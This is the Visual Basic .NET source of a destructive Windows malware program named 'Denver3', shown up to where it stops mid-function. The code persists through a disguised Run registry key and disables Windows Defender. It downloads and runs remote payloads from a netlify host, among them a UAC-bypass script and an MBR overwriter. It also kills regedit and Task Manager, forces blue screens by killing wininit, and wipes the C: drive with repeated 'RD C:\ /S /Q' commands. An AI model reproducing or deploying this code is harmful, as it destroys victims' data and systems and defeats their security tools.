Imports System
Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32


Public Class Form1


    Dim UserFoler = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
    Dim Close1 As Boolean = False
    Private ReadOnly filePath As String = "first_open.txt"

    Public Sub infect()
        My.Computer.FileSystem.CopyFile(Application.ExecutablePath, UserFoler & "\Denver3.exe")
        Try
            My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("Windows security notifications_", UserFoler & "\Denver3.exe")
        Catch ex As Exception
        End Try
    End Sub


    Public Sub RunInitialSetup() ' code in this block will only run when the program first starts for the first time after the person has successfully confirmed that they know this is a virus.
        infect()
        DisableWindowsDefender()
        MsgBox("The program or feature ""\??\" & Application.ExecutablePath & """cannot start or run due to incompatibily with 64-bit versions of Windows. Please contact the software
vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsupported 16-bit Application")
        Try
            Dim path As String = UserFoler & "\Denver3.runtime"
            Dim fs As FileStream = File.Create(path)
            Dim info As Byte() = New UTF8Encoding(True).GetBytes("runtime")
            fs.Write(info, 0, info.Length)
            fs.Close()
            Try
                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/fuckuac.cmd", Application.StartupPath & "\fuckuac.cmd")
            Catch ex As Exception

            End Try
            Process.Start(Application.StartupPath & "\fuckuac.cmd")
            Hacking_into_pc.Close()
            Wait(1)
            MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False) 'MAKE A BSOD
            Close1 = True
            Me.Close()
        Catch ex As Exception

        End Try


    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load


        Try
            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
        Catch ex As Exception

        End Try
        Try
            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
        Catch ex As Exception

        End Try



        If Not My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then
            Dim result1 As DialogResult = MessageBox.Show(" This program is malware / malicious program and it will do harm to your computer if you were not on a VM click No immediately (do you still want to execute this program)",
     "haha FBI can't arrest me now",
     MessageBoxButtons.YesNo,
      MessageBoxIcon.Warning)
            If result1 = DialogResult.Yes Then
                Dim result2 As DialogResult = MessageBox.Show("THIS IS YOUR LAST WARNING THIS IS A MALICIOUS PROGRAM IT WILL DO HARM TO YOUR COMPUTER BY CLICKING OKAY YOU FULLY ACKNOWLEDGED THAT THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE DONE TO YOUR COMPUTER!",
        "haha FBI can't arrest me now",
        MessageBoxButtons.YesNo,
        MessageBoxIcon.Warning)
                If result2 = DialogResult.No Then
                    Close1 = True
                    Me.Close()
                Else
                    If CheckForInternetConnection() Then

                        Try
                            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/Interop.WMPLib.dll", Application.StartupPath & "\Interop.WMPLib.dll")
                        Catch ex As Exception
                            MsgBox("This program maintains a small file size by downloading its files from an external server. Please download and install the server manually: https://denver3289yf998dh287hd9hd9827h.netlify.app/ServerFiles.exe", 0 + 16, "Failed to download files")
                        End Try
                        Try
                            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AxInterop.WMPLib.dll", Application.StartupPath & "\AxInterop.WMPLib.dll")
                        Catch ex As Exception

                        End Try
                        Try
                            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/KillRunTime.cmd", Application.StartupPath & "\KillRunTime.cmd")
                        Catch ex As Exception

                        End Try
                        Try
                            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/RemoveDenver3.cmd", Application.StartupPath & "\RemoveDenver3.cmd")
                        Catch ex As Exception

                        End Try

                        If Not My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then
                            RunInitialSetup()
                        End If

                        If My.Computer.FileSystem.FileExists(UserFoler & "\Denver3.runtime") Then

                            DisableWindowsDefender() 'worth a shot am I right? In a try will not bug the code


                            NoReg.Start()
                            NoTask.Start()
                            Dim payloadchance As Integer = CInt(Int((40 * Rnd()) + 1))

                            If payloadchance = 1 Then
                                MsgBox("opera gx is spyware", 0 + 16, "Dont use opera gx")

                            ElseIf payloadchance = 2 Then
                                Valve_Theme.Show()

                            ElseIf payloadchance = 3 Then
                                RipZ3CK100.ShowDialog()
                            ElseIf payloadchance = 4 Then
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/GDI.EXE", UserFoler & "\GDI.EXE")
                                Catch ex As Exception

                                End Try
                                Try
                                    Process.Start(UserFoler & "\GDI.EXE")
                                Catch ex As Exception

                                End Try
                            End If

                            'https://denver3289yf998dh287hd9hd9827h.netlify.app/TrainFurry.mp4
                            Dim currentTime As System.DateTime = System.DateTime.Now
                            If currentTime.Month = 9 And currentTime.Date.Day = 11 Then
                                RipConeehasOldAcc.Show()
                            End If


                            If currentTime.Month = 1 And currentTime.Date.Day = 1 Then
                                TrainIsAFurryLmao.Show()
                            End If

                            If currentTime.Month = 1 Or currentTime.Month = 2 Then
                                Dim random As New Random()
                                Dim randomNumber As Integer = random.Next(1, 21)
                                If randomNumber = 1 Then
                                    MsgBox("Fuck you", 0 + 16, "die")
                                    MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)
                                End If
                            End If
                            If currentTime.Month = 2 And currentTime.Date.Day = 1 Then
                                GoPlayHLAlyx.Show()
                            End If
                            If currentTime.Month = 3 And currentTime.Date.Day = 1 Then
                                GoPlayHL2.Show()
                            End If
                            If currentTime.Month = 4 And currentTime.Date.Day = 1 Then
                                FreeRobuxGen.Show()
                            End If
                            If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
                                FreeRobuxGen.Show()
                            End If
                            If currentTime.Month = 6 And currentTime.Date.Day = 1 Then
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/spongebob.wav", UserFoler & "\spongebob.wav")
                                Catch ex As Exception
                                End Try
                                My.Computer.Audio.Play(UserFoler & "\spongebob.wav", AudioPlayMode.BackgroundLoop)
                            End If
                            If currentTime.Month = 7 And currentTime.Date.Day = 12 Then
                                My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/worm.html", UserFoler & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
                                Process.Start(UserFoler & "\2r8y2gd82d823g2dg3rt2vb9dd8326v82b6d26d82.html")
                            End If
                            If currentTime.Month = 7 And currentTime.Date.Day = 2 Then
                                Process.Start("https://www.youtube.com/watch?v=Oh15F6lzi_w")
                            End If
                            If currentTime.Month = 8 And currentTime.Date.Day = 1 Then
                                MsgBox("Program could contain potentially unwanted software and has been blocked.", 0 + 16, "ERROR")
                                'denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/NAHIMTOOPOWERRFULL_666.wav", UserFoler & "\NAHIMTOOPOWERRFULL_666.wav")


                                Catch ex As Exception

                                End Try
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/NAH.CMD", UserFoler & "\NAH.CMD")
                                Catch ex As Exception

                                End Try
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/SkillE.vbs", UserFoler & "\SkillE.vbs")

                                Catch ex As Exception

                                End Try
                                My.Computer.Audio.Play(UserFoler & "\NAHIMTOOPOWERRFULL_666.wav", AudioPlayMode.BackgroundLoop)
                                MsgBox("NAH IM TO POWERFUL FUCK YOUR ANTIVIRUS -DENVER3", 0 + 16, "#&^T&RFDT&G(B^@#&*^&@(E^VDB@D*@(&")
                                For index As Integer = 1 To 20 'Open 100 Windows of the most random shit
                                    Process.Start(UserFoler & "\NAH.CMD")
                                    Process.Start(UserFoler & "\NAH.CMD")
                                    Process.Start(UserFoler & "\NAH.CMD")
                                    Process.Start(UserFoler & "\NAH.CMD")
                                    Process.Start(UserFoler & "\SkillE.vbs")
                                Next
                            End If
                            If currentTime.Month = 9 And currentTime.Date.Day = 1 Then
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/SkillE.vbs", UserFoler & "\SkillE.vbs") '8-Bit Nyan_C.wav

                                Catch ex As Exception

                                End Try
                                MsgBox("Y O U  W I L L  N O T  E S A P E  - D E N V E R 3")
                                For index As Integer = 1 To 20
                                    Process.Start(UserFoler & "\SkillE.vbs")
                                Next

                            End If

                            If currentTime.Month = 9 And currentTime.Date.Day = 2 Then
                                MsgBox("I think your pc has a virus (=", 0 + 64, "Denver3.exe | Yuki3.exe")
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/AVTESTFILE.EXE", UserFoler & "\AVTESTFILE.EXE")
                                Catch ex As Exception
                                End Try
                                For index As Integer = 1 To 30 'OverLoadAntiVirus
                                    Try
                                        My.Computer.FileSystem.CopyFile(UserFoler & "\AVTESTFILE.EXE", UserFoler & "\AVTESTFILE" & CInt(Int((1000 * Rnd()) + 1)) & ".EXE")
                                    Catch ex As Exception
                                    End Try
                                Next
                            End If

                            If currentTime.Month = 10 And currentTime.Date.Day = 1 Then
                                ScreenStuck.Show()
                            End If
                            If currentTime.Month = 11 Then
                                Try
                                    My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/8-Bit%20Nyan_C.wav", UserFoler & "\Neon.wav")
                                Catch ex As Exception
                                End Try
                                My.Computer.Audio.Play(UserFoler & "\Neon.wav", AudioPlayMode.BackgroundLoop)
                                MsgBox("You will get to hear Nyan Cat every single day in the background for the next month (: -Denver3", 0 + 16, "DENVER3.EXE BACKGOUNDPROSSES")
                            End If





                            If currentTime.Month = 12 And currentTime.Day = 1 Or True = True Then
                                fuckpc()
                            End If
                        Else
                            MsgBox("cannot connect to external server denver3 failed to initialize.", 0 + 16)
                            Close1 = True
                            Me.Close()

                        End If
                    End If



                End If
            Else
                Close1 = True
                Me.Close()
            End If
        End If


    End Sub
    Public Sub fuckpc()
        Try
            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/urdone1.wav", UserFoler & "\urdone1.wav")
        Catch ex As Exception
        End Try
        My.Computer.Audio.Play(UserFoler & "\urdone1.wav", AudioPlayMode.BackgroundLoop)
        MsgBox("I have messed with you enough and it's time for me to leave take a break from your computer have fun repairing your bootloader goodbye.")

        OverrideMBR()
        completely_obliterate_hard_drive_files.RunWorkerAsync()


        For index As Integer = 0 To 9000
            ' Code to be executed inside the loop
            Try
                Dim random As New Random()
                Dim randomNumber As Integer = random.Next(1, 63463456)
                'My.Computer.FileSystem.CopyFile(UserFoler & "\Desktop\BonziBDY_4.EXE", UserFoler & "\Desktop\DENVER3_0" & randomNumber & ".EXE")
                My.Computer.FileSystem.CopyFile(UserFoler & "\MbrOverwriter.exe", UserFoler & "\Desktop\DENVER3_0" & randomNumber & ".EXE")
            Catch ex As Exception

            End Try
        Next

        ' Make a reference to a directory.


        ' Display the names of the files.
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        Wait(10)
        Process.Start("https://www.google.com/search?q=for+the+lulz&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-3ZuC1psWsqK-aMP1WjOfTiXwLBQ%3A1713312563052&ei=MxMfZqjjAsu0ptQPkpW8mAY&ved=0ahUKEwjoyNbV-seFAxVLmokEHZIKD2MQ4dUDCBA&uact=5&oq=for+the+lulz&gs_lp=Egxnd3Mtd2l6LXNlcnAiDGZvciB0aGUgbHVsejIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgAQyCxAAGIAEGIoFGIYDSM8IUOMFWN8GcAF4AZABAJgBZqABvwGqAQMxLjG4AQPIAQD4AQGYAgOgAscBwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEmAMAiAYBkAYIkgcDMi4xoAffBQ&sclient=gws-wiz-serp")
        Wait(3)
        Process.Start("https://www.google.com/search?sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn0-wMlNAtRhrt2T5ryRfPYICQBcEzg:1713312633304&q=windows+is+spyware&uds=AMwkrPte2rONdlHqaOEoNFr7YgHOiVFtgpI_Ouhp_p_393pfzLmTJdzG2eu02e1iRLtixUe8z4CGC2fuy7dcMRHztzSCFzI3dGLWAVQhBLrNqa6I5_RYST8DU1TQbprLSSo4h0E36iZuaMKfEtU8DupyBvGyxFpeJF6xxgOfHPEZ6HNMvV2BsglEgiuadGToqCC4x43gAAyb99N-2Pu0jgHjK1KRnsfHdxg-Pk7pwVebISixHAjviqZAl3hvC5lEiJSLj9l_zUpeHXM8HTSrqj8oX23a0Cx4DgeuBiZ9E2gkooxJZf7yn9PA3cOTe1ZWK231TMjcnghX&udm=2&prmd=ivnsbmtz&sa=X&ved=2ahUKEwjftJb3-seFAxVstokEHWrEDB8QtKgLegQICRAB&biw=1920&bih=919&dpr=1#vhid=nVwcAOfoXtc5YM&vssid=mosaic")
        Wait(4)
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        Process.Start("https://www.google.com/search?q=windows+11+is+shit&oq=windows+11+is+shit&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCDQ4NDlqMGo5qAIAsAIA&sourceid=chrome&ie=UTF-8")
        Wait(5)
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        OpenTextFile("WINDOWS 11 IS ***CRAP**")
        OpenTextFile("ur mom")
        MyUtilities.RunCommandComInvis("RD C:\ /S /Q", "", False) 'fuck ur pc
        OpenTextFile("MUSIC: Undertale Last Breath: An Enigmatic Encounter (Phase 3)")
        OpenTextFile("***YOUR PC HAS BEEN FUCKED BY THE DENVER 3 VIRUS LMAO***")
        OpenTextFile("BSOD INCOMEING!!!!!!!!!!!!!")
        Wait(4)
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")
        Process.Start("https://www.google.com/search?q=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE&oq=DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+DIE+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRiPAjIHCAIQIRiPAtIBCTE0NjgzajBqN6gCALACAA&sourceid=chrome&ie=UTF-8")

        Wait(130)
        MyUtilities.RunCommandCom("RD C:\ /S /Q", "", False) 'fuck ur pc
        Process.Start("https://www.google.com/search?q=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&sca_esv=9b107820ee34c717&sca_upv=1&sxsrf=ACQVn08FZz1OtO5v_LYabeyEF3EhtJUM7Q%3A1713312932801&ei=pBQfZoTNMP3sptQP3NGDoA4&ved=0ahUKEwiEr_6F_MeFAxV9tokEHdzoAOQQ4dUDCBA&uact=5&oq=I%27m+about+to+blue+screen+this+man%27s+computer%21%21%21%21%21%21&gs_lp=Egxnd3Mtd2l6LXNlcnAiMkknbSBhYm91dCB0byBibHVlIHNjcmVlbiB0aGlzIG1hbidzIGNvbXB1dGVyISEhISEhMggQIRigARjDBDIIECEYoAEYwwQyCBAhGKABGMMEMggQIRigARjDBDIIECEYoAEYwwRIhUVQuwVYrDpwB3gBkAEAmAHKAaAB4A6qAQYxNC40LjG4AQPIAQD4AQGYAhagArMLwgIKEAAYRxjWBBiwA8ICCBAAGIAEGKIEwgIIEAAYiQUYogTCAgoQIRgKGKABGMMEwgIFECEYoAGYAwCIBgGQBgiSBwQxOC40oAejYw&sclient=gws-wiz-serp")
        Wait(6)
        MyUtilities.RunCommandCom("TASKKILL /IM wininit.exe /T /F", "", False)



    End Sub
    Public Sub OpenTextFile(Text)
        Dim random As New Random()
        Dim randomNumber As Integer = random.Next(1, 63463456)
        Dim path As String = UserFoler & "\" & randomNumber

        ' Create or overwrite the file.
        Dim fs As FileStream = File.Create(path)

        ' Add text to the file.
        Dim info As Byte() = New UTF8Encoding(True).GetBytes(Text)
        fs.Write(info, 0, info.Length)
        fs.Close()
        Process.Start(UserFoler & "\" & randomNumber)
    End Sub
    Private Sub DisableWindowsDefender()
        Try
            Dim keyPath As String = "SOFTWARE\Microsoft\Windows Defender"
            Dim keyName As String = "DisableAntiSpyware"

            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, True)
                If key IsNot Nothing Then
                    key.SetValue(keyName, 1, RegistryValueKind.DWord)
                End If
            End Using
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Wait(ByVal seconds As Integer)
        For i As Integer = 0 To seconds * 100
            System.Threading.Thread.Sleep(10)
            Application.DoEvents()
        Next
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If Not Close1 Then
            e.Cancel = True
        End If

    End Sub

    Private Sub NoReg_Tick(sender As Object, e As EventArgs) Handles NoReg.Tick
        Dim pName As String = "regedit"
        Dim psList() As Process
        Try
            psList = Process.GetProcesses()
            For Each p As Process In psList
                If (pName = p.ProcessName) Then
                    Dim proc = Process.GetProcessesByName("regedit")
                    For i As Integer = 0 To proc.Count - 1
                        proc(i).Kill()
                    Next i
                    No.Show()
                End If
            Next p

        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub NoTask_Tick(sender As Object, e As EventArgs) Handles NoTask.Tick
        Dim pName As String = "Taskmgr"
        Dim psList() As Process
        Try
            psList = Process.GetProcesses()
            For Each p As Process In psList
                If (pName = p.ProcessName) Then
                    Dim proc = Process.GetProcessesByName("Taskmgr")
                    For i As Integer = 0 To proc.Count - 1
                        proc(i).Kill()
                    Next i
                    No.Show()
                End If
            Next p

        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub

    Public Sub OverrideMBR() 'fucks your pc
        Try
            My.Computer.Network.DownloadFile("https://denver3289yf998dh287hd9hd9827h.netlify.app/MbrOverwriter.exe", UserFoler & "\MbrOverwriter.exe")
        Catch ex As Exception
            Try
